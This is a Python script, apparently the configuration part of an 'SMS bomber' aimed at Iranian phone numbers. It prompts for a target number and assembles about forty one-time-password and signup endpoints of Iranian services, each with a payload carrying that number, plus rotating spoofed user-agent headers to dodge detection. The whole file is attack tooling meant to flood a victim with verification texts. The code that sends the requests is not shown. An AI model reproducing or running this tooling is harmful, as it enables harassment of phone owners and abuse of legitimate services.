
#########################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
reset = "\033[0m"
#########################


name = "Danyal"
github = "https://github.com/Danyalss"
pirate = '''       !
       !
       ^
      / \\
     /___\\
    |=   =|
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
   /|##!##|\\
  / |##!##| \\
 /  |##!##|  \\
|  / ^ | ^ \\  |
| /  ( | )  \\ |
|/   ( | )   \\|
    ((   ))
   ((  :  ))
   ((  :  ))
    ((   ))
     (( ))
      ( )
       .
       .
       .'''

# چاپ کد پیریت با رنگ زرد
print(f"{Green}Name: {name}")
print(f"{Green}Github: {github}{reset}")
print(f"{Green}{pirate}{reset}")


number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)

in_Iran = input("" + cyan + "[" + Red + "Are" + cyan + "]─[" + Blue + "you in" + cyan + "]─[" + Green + "Iran (y/n) ? " + cyan + "]" + Red + ": " + Reset)



url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

url_sheypoor= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor= {"username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_snapp_box= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_snapp_box= {"phoneNumber":"0" + number}


url_banimode = "https://mobapi.banimode.com/api/v2/auth/request"
json_banimode = {"phone": "0" + number}

url_ostadkr = "https://api.ostadkr.com/login"
json_ostadkr = {"mobile": "0" + number}

url_drnext = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
json_drnext = {"mobile": "0" + number}

url_snapp = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}"

url_basalam = "https://auth.basalam.com/otp-request"
json_basalam = {
"client_id": 11,
"mobile": "0"+number}

url_buskool = "https://www.buskool.com/send_verification_code"
json_buskool = {"phone": "0" + number}
url_jabama = "https://taraazws.jabama.com/api/v4/account/send-code"
json_jabama = {"mobile": "0" + number}

url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba = {"phoneNumber": "0"+number}


url_digitoon = "https://apitwo.digitoon.ir/mobile_login_step1/8?dg_id=99E3A80D%2C99E3A80D"
json_digitoon = {
        "device_id": "desktop",
        "device_model": "browser-none-none-Firefox-112",
        "device_os": "NextJS-10-Windows",
        "mobile": "0"+number
    }
    
url_sibapp = "https://api.sibapp.net/api/v1/user/register"
json_sibapp ={"phone_number": "0" + number}

url_Drdr= "https://drdr.ir/api/registerEnrollment/register/verify"
json_Drdr = {
	"phoneNumber": "0" + number,
	"userType": "PATIENT"
    }

url_kukala= "https://api.kukala.ir/api/user/Otp"
json_kukala = {"phoneNumber": "0" + number}

url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
json_tapsi = {
        "credential": {
            "phoneNumber": "0" + number,
            "role": "PASSENGER"
        },
        "otpOption": "SMS"
    }

url_flightio = "https://flightio.com/bff/Authentication/CheckUserKey"
json_flightio = {
        "userKey": "98-" + number,
        "userKeyType": 1
    }

url_football_360 = "https://football360.ir/api/auth/verify-phone/"
json_football_360 = {"phone_number": "+98" + number}



url_miare = "https://www.miare.ir/api/otp/driver/request/"
json_miare = {"phone_number": "0" + number}

url_pinket = "https://pinket.com/api/cu/v2/phone-verification"
json_pinket = {"phoneNumber": "0" + number}

url_torob = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"

url_cafebazaar = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_cafebazaar = {
	"properties": {
		"clientID": "ukdor3dqin5dr1wy0jcrjfy94q0d0v4g",
		"clientVersion": "web",
		"deviceID": "ukdor3dqin5dr1wy0jcrjfy94q0d0v4g",
		"language": 2
	},
	"singleRequest": {
		"getOtpTokenRequest": {
			"username": "98" + number
		}
	}
}

url_gap = f"https://core.gap.im/v1/user/add.json?mobile=%2B98{number}"

url_sibche = "https://api.sibche.com/profile/sendCode"
json_sibche = {"mobile": "0" + number}


url_ponisha = "https://ponisha.ir/send-mobile-verfication"
json_ponisha = {
	"mobile": "+98" + number,
	"type": "1"
}


url_karlancer = "https://www.karlancer.com/api/register"
json_karlancer = {
	"phone": "0" + number,
	"role": "employer"
}

url_jobvision = f"https://account.jobvision.ir/Candidate/SendVerificationForRegister?mobile=0{number}"

url_komodaa = "https://api.komodaa.com/api/v2.6/loginRC/request"
json_komodaa = {"phone_number": "0" + number}

url_pindo = "https://api.pindo.ir/v1/user/login-register/"
json_pindo = {"phone": "0" + number}




















#  from date import url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_tci


heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
     {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]
